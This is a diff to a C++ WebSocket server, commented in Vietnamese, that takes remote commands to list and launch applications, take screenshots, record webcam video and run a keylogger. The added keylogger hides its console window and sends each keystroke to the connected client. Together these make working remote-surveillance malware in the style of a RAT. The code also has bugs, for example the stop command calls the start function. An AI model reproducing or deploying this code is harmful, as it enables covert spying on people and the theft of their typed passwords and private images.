@@ -24,29 +24,35 @@
 
 #include "../Webcam/Webcam.cpp" // Chèn hàm chụp ảnh từ webcam
 
-// #include "../KeyLog/KeyLog.cpp" // Chèn hàm keylog
+#include "../KeyLog/KeyLog.cpp" // Chèn hàm keylog
 
 #include <iostream>
 #include <string>
-#include <thread>
+#include <future>
 #include <chrono>
+#include <vector>
+
+bool keyLogFlag = false;
 
 typedef websocketpp::server<websocketpp::config::asio> server;
 
-void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg) {
-
+void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg, std::vector<std::future<void>> &f) {
     std::string received = msg->get_payload();
     std::cout << "Received: " << received << std::endl;
 
     if (received == "list_apps") {
         // Gọi hàm liệt kê ứng dụng và gửi kết quả về client
-        std::string app_list = ListApplication(); // Giả sử hàm này trả về danh sách ứng dụng đã cài đặt
+        std::string app_list; // Giả sử hàm này trả về danh sách ứng dụng đã cài đặt
+        f.push_back(std::async(std::launch::async, ListApplication, std::ref(app_list)));
+        f.back().wait();
         s->send(hdl, app_list, msg->get_opcode());
     }
 
     else if (received.rfind("start_app:", 0) == 0) {
         std::string app_to_start = received.substr(10); // Lấy tên ứng dụng sau "start_app:"
-        if (!StartApplication(app_to_start)) {
+        bool flag = false;
+        f.push_back(std::async(std::launch::async, StartApplication, std::ref(app_to_start), std::ref(flag)));
+        if (!flag) {
             std::cout << "Failed to start application: " << app_to_start << std::endl;
             s->send(hdl, "Failed to start application: " + app_to_start, msg->get_opcode());
             return;
@@ -56,7 +62,9 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
 
     else if (received.rfind("stop_app:", 0) == 0) {
         std::string app_to_stop = received.substr(9); // Lấy tên ứng dụng sau "stop_app:"
-        if (!StopApplication(app_to_stop)) {
+        bool flag = false;
+        f.push_back(std::async(std::launch::async, StartApplication, std::ref(app_to_stop), std::ref(flag)));
+        if (!flag) {
             std::cout << "Failed to stop application: " << app_to_stop << std::endl;
             s->send(hdl, "Failed to stop application: " + app_to_stop, msg->get_opcode());
             return;
@@ -66,108 +74,146 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
 
     else if (received == "screenshot") {
         // 1. Chụp màn hình và lưu vào file
-        TakeScreenshot(); // Giả định thành công
-
-        const std::string filename = "screenshot.bmp";
-        std::ifstream file(filename, std::ios::binary | std::ios::ate); // Thêm std::ios::ate để lấy kích thước file dễ hơn
-
-        if (!file.is_open()) {
-            // Xử lý lỗi nếu không mở được file
-            // Gửi thông báo lỗi qua websocket (tùy chọn)
-            std::cerr << "Lỗi: Không thể mở file ảnh chụp màn hình.\n";
-            return; // Dừng xử lý
-        }
-
-        // Lấy kích thước file
-        std::streamsize size = file.tellg();
-        file.seekg(0, std::ios::beg);
-
-        // 2. Đọc file vào buffer
-        std::vector<char> buffer(size);
-        if (file.read(buffer.data(), size)) {
-            // 3. Gửi nhị phân
-            s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
-            s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
-            std::cout << "Sent " << size << " bytes of screenshot.\n";
-        } 
-        else {
-            std::cerr << "Failed to read screenshot file.\n";
-        }
-
-        // 4. Dọn dẹp (Giải phóng file)
-        file.close(); // Đảm bảo file được đóng trước khi xóa
-        if (std::remove(filename.c_str()) == 0) {
-            std::cout << "Deleted temporary screenshot file.\n";
-        } 
-        else {
-            std::cerr << "Warning: Could not delete temporary screenshot file.\n";
-        }
+        auto fakeFunction = [s, hdl, received, msg](){
+            TakeScreenshot(); // Giả định thành công
+    
+            const std::string filename = "screenshot.bmp";
+            std::ifstream file(filename, std::ios::binary | std::ios::ate); // Thêm std::ios::ate để lấy kích thước file dễ hơn
+            if (!file.is_open()) {
+                // Xử lý lỗi nếu không mở được file
+                // Gửi thông báo lỗi qua websocket (tùy chọn)
+                std::cerr << "Lỗi: Không thể mở file ảnh chụp màn hình.\n";
+                return; // Dừng xử lý
+            }
+            
+            // Lấy kích thước file
+            std::streamsize size = file.tellg();
+            file.seekg(0, std::ios::beg);
+            
+            // 2. Đọc file vào buffer
+            std::vector<char> buffer(size);
+            if (file.read(buffer.data(), size)) {
+                // 3. Gửi nhị phân
+                s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
+                s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
+                std::cout << "Sent " << size << " bytes of screenshot.\n";
+            } 
+            else {
+                std::cerr << "Failed to read screenshot file.\n";
+            }
+            
+            // 4. Dọn dẹp (Giải phóng file)
+            file.close(); // Đảm bảo file được đóng trước khi xóa
+            if (std::remove(filename.c_str()) == 0) {
+                std::cout << "Deleted temporary screenshot file.\n";
+            } 
+            else {
+                std::cerr << "Warning: Could not delete temporary screenshot file.\n";
+            }
+        };
+        f.push_back(std::async(std::launch::async, fakeFunction));
     }
 
     else if (received == "webcam") {
-        CaptureWebcamImage(); // Quay webcam và lưu file thành "webcam.mp4"
-
-        // 1. Tên file phải khớp với tên file output trong hàm quay phim
-        const std::string filename = "webcam.mp4"; 
-
-        // Mở file ở chế độ Binary + At End (để lấy size)
-        std::ifstream file(filename, std::ios::binary | std::ios::ate);
-        
-        if (!file.is_open()) {
-            std::cerr << "Error! File not found: " << filename << "\n";
-            return;
-        }
-
-        // Lấy kích thước file
-        std::streamsize size = file.tellg();
-        file.seekg(0, std::ios::beg); // Quay lại đầu file để đọc
-
-        // Kiểm tra dung lượng (10s video ~ vài MB, vector chịu được)
-        // Nếu file > 100MB thì nên chia nhỏ (chunking), nhưng 10s thì load hết vào RAM ok.
-        std::vector<char> buffer(size);
-
-        // 2. Đọc toàn bộ file vào buffer
-        if (file.read(buffer.data(), size)) {
-            std::cout << "Sending MP4 file (" << size << " bytes) over WebSocket...\n";
+        auto fakeFunction = [s, hdl, received, msg](){
+            CaptureWebcamImage(); // Quay webcam và lưu file thành "webcam.mp4"
+    
+            // 1. Tên file phải khớp với tên file output trong hàm quay phim
+            const std::string filename = "webcam.mp4"; 
+    
+            // Mở file ở chế độ Binary + At End (để lấy size)
+            std::ifstream file(filename, std::ios::binary | std::ios::ate);
             
-            // 3. Gửi nhị phân (Opcode::binary)
-            try {
-                s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
-                s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
-                std::cout << "Sent successfully!\n";
-            } catch (const websocketpp::exception & e) {
-                std::cerr << "Error sending WebSocket: " << e.what() << "\n";
+            if (!file.is_open()) {
+                std::cerr << "Error! File not found: " << filename << "\n";
+                return;
             }
-        } 
-        else {
-            std::cerr << "Error: Could not read file data.\n";
-        }
-
-        // 4. Dọn dẹp
-        file.close(); // Đảm bảo file được đóng trước khi xóa
-        if (std::remove(filename.c_str()) == 0) {
-            std::cout << "Deleted temporary screenshot file.\n";
-        } 
-        else {
-            std::cerr << "Warning: Could not delete temporary screenshot file.\n";
-        }
+    
+            // Lấy kích thước file
+            std::streamsize size = file.tellg();
+            file.seekg(0, std::ios::beg); // Quay lại đầu file để đọc
+    
+            // Kiểm tra dung lượng (10s video ~ vài MB, vector chịu được)
+            // Nếu file > 100MB thì nên chia nhỏ (chunking), nhưng 10s thì load hết vào RAM ok.
+            std::vector<char> buffer(size);
+    
+            // 2. Đọc toàn bộ file vào buffer
+            if (file.read(buffer.data(), size)) {
+                std::cout << "Sending MP4 file (" << size << " bytes) over WebSocket...\n";
+                
+                // 3. Gửi nhị phân (Opcode::binary)
+                try {
+                    s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
+                    s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
+                    std::cout << "Sent successfully!\n";
+                } catch (const websocketpp::exception & e) {
+                    std::cerr << "Error sending WebSocket: " << e.what() << "\n";
+                }
+            } 
+            else {
+                std::cerr << "Error: Could not read file data.\n";
+            }
+    
+            // 4. Dọn dẹp
+            file.close(); // Đảm bảo file được đóng trước khi xóa
+            if (std::remove(filename.c_str()) == 0) {
+                std::cout << "Deleted temporary screenshot file.\n";
+            } 
+            else {
+                std::cerr << "Warning: Could not delete temporary screenshot file.\n";
+            }
+        };
+        f.push_back(std::async(std::launch::async, fakeFunction));
     }
 
-    // else if (received == "start_keylog") {
-    //     // Bắt đầu keylogging
-    //     LOG("=== Keylogging started ===\n");
-    //     s->send(hdl, "Keylogging started.", msg->get_opcode());
-    // }
+    else if (received == "start_keylog" && !keyLogFlag) {
+        // Bắt đầu keylogging
+        s->send(hdl, "Keylogging started.", msg->get_opcode());
+        keyLogFlag = true;
+        auto fakeFunction = [s, hdl, received, msg](){
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+            while (keyLogFlag) {
+                Sleep(10);
+                std::string output;
+                for (int KEY = 8; KEY <= 255; KEY++){
+                    if (GetAsyncKeyState(KEY) == -32767) {
+                        if (SpecialKeys(KEY, output) == true) {
+                            s->send(hdl, output, msg->get_opcode());
+                        }
+                        else if (KEY >= 65 && KEY <= 90) { // Chữ cái A-Z
+                            bool shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+                            bool caps_active = GetKeyState(VK_CAPITAL) & 0x0001;
+                            bool is_uppercase = shift_pressed ^ caps_active;
+                            
+                            if (is_uppercase) {
+                                s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
+                            } 
+                            else {
+                                s->send(hdl, std::string(1, char(KEY + 32)), msg->get_opcode());
+                            }
+                            
+                        } 
+                        // 3. Xử lý các ký tự khác (số 0-9, dấu chấm câu, v.v.)
+                        else if (KEY >= 48 && KEY <= 57) { // Số 0-9
+                            s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
+                        }
+                    }
+                }
+            }
+        };
+        f.push_back(std::async(std::launch::async, fakeFunction));
+    }
 
-    // else if (received == "stop_keylog") {
-    //     // Dừng keylogging
-    //     LOG("=== Keylogging stopped ===\n");
-    //     s->send(hdl, "Keylogging stopped.", msg->get_opcode());
-    // }
+    else if (received == "stop_keylog" && keyLogFlag) {
+        // Dừng keylogging
+        keyLogFlag = false;
+        s->send(hdl, "Keylogging stopped.", msg->get_opcode());
+    }
 
     else {
         s->send(hdl, "Unknown command: " + received, msg->get_opcode());
     }
+
 }
 
 int main() {
@@ -176,14 +222,16 @@ int main() {
     // g++ -std=c++17 -I./ -I./asio/include serverComNet.cpp -o serverComNet.exe -lmswsock  -lws2_32 -lgdi32 -luser32 -lmfplat -lmf -lmfreadwrite -lmfuuid -lshlwapi -lole32 -loleaut32 -static-libgcc -static-libstdc++ "-Wl,-Bstatic" -lstdc++ -lpthread "-Wl,-Bdynamic"
     
     server s;
+    std::vector<std::future<void>> f; // code đa luồng
 
     try {
+
         // comment 2 dong nay roi chay List App se ra chu TRUNG QUOC
         s.clear_access_channels(websocketpp::log::alevel::all);
         s.clear_error_channels(websocketpp::log::elevel::all);
 
         s.init_asio();
-        s.set_message_handler(std::bind(&on_message, &s, std::placeholders::_1, std::placeholders::_2));
+        s.set_message_handler(std::bind(&on_message, &s, std::placeholders::_1, std::placeholders::_2, std::ref(f)));
 
         s.listen(9000);          // Cổng server
         s.start_accept();
@@ -194,4 +242,5 @@ int main() {
     catch (const std::exception& e) {
         std::cerr << "Error: " << e.what() << std::endl;
     }
+
 }
